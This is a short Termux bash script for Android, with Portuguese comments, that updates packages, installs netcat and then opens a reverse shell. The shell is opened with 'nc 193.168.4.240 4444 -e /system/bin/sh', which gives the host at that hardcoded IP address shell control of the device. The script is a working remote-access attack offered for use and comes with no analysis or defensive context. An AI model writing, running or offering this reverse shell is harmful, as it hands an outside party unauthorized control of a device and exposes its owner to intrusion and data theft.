#!/data/data/com.termux/files/usr/bin/bash

# Atualizar pacotes
pkg update && pkg upgrade -y

# Instalar Netcat
pkg install netcat -y

# Executar o shell reverso
nc 193.168.4.240 4444 -e /system/bin/sh
                                              
